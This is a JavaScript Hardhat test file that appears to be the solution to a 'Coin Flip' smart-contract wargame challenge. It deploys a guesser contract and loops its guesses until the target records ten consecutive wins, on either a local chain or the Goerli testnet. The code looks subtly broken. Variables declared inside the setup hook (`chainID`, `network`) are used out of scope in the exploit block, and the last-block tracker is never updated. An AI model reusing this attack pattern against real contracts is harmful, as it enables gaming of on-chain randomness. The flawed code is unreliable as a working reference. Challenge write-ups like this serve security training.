const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Coin Flip', function () {

    let deployer, attacker;
    
    before(async () =>{
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        const network = await ethers.provider.getNetwork();
        const chainID = network.chainId
        
        if (chainID == 5){ // goerli testnet
            /** connect to Dapp in goerli **/
            [attacker] = await ethers.getSigners();
            const ContractFactory = await ethers.getContractFactory('CoinFlip');
            this.target = ContractFactory.attach("");
            
        } else { // local network - hardhat  
            /** local test **/
            [deployer, attacker] = await ethers.getSigners();
            const ContractFactory = await ethers.getContractFactory('CoinFlip', deployer);
            this.target = await ContractFactory.deploy();
        }
    });

    it('Exploit', async () => {
        /** CODE YOUR EXPLOIT HERE */
        const GuesserFactory = await ethers.getContractFactory('CoinFlipGuesser', attacker);
        const guesser = await GuesserFactory.deploy();
        let lastblock = 1;
        let wins = 0;
        
        while( wins < 10 ){
            // check block number
            let blockNumber = await ethers.provider.getBlockNumber();
            if (lastblock == blockNumber) {
                if (chainID == 5) continue;
                else await network.provider.send("evm_increaseTime", [100]);
            }
            // guess
            let guessTX = await guesser.connect(attacker).guess(this.target.address); await guessTX.wait();
            // check consecutiveWins 
            wins = parseInt(await this.target.consecutiveWins());
            console.log(`\t wins: ${wins}`);
        }

    }).timeout(0);

    after(async () => {
        /** SUCCESS CONDITIONS */
        expect(parseInt(await this.target.consecutiveWins())).to.be.eq(10);
    });
});